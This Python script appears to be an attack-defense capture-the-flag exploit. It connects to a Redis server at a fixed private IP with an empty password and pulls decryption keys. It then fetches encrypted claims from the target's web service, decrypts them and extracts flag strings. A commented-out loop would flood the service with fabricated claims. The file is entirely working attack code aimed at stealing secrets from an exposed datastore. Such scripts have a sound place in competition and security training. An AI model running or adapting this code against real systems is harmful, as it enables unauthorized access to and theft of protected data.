#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re, requests, redis
import string, random, json, base64
from old_sploits.crypto import cipher


def team_generator(size=12, chars=string.digits + string.ascii_letters):
    return ''.join(random.choice(chars) for _ in range(size))

def flag_generator(size=31, chars=string.digits + string.ascii_uppercase):
    return ''.join(random.choice(chars) for _ in range(size)) + '='

def decrypt_claim(cipher_text, key):
    decoded = base64.b64decode(cipher_text)
    decoded = decoded.decode('utf-8')
    return cipher.decrypt(decoded, key)

#Generate flags
#while (True):
#    team = team_generator()
#    flag = flag_generator()
#    repsonse = s.post(url + '/claims', json={'team' : team, 'flag' : flag}, timeout=(None,None)).text
#    print(repsonse)

#ip = sys.argv[1]
ip = '192.168.0.100' + ':5535'
url = 'http://{}'.format(ip)


IP = '192.168.0.100'
PORT = 6379

PASSWORD = ''
DATABASE = 0
PREFIX = ''

redis = redis.Redis(host=IP,
                    port=PORT,
                    password=PASSWORD,
                    db=DATABASE,
                    socket_timeout=None)



s = requests.Session()

for i in range(1,1000):
    key = redis.hgetall('key:{}'.format(i))[b'text'].decode('ascii')
    jsonResponse = s.get(url + '/claims/{}'.format(i), timeout=(None,None)).text
    claim = json.loads(jsonResponse)['cipher_text']
    print(re.findall('[A-Z0-9]{31}=', decrypt_claim(claim, key).decode('ascii')))

s.close()

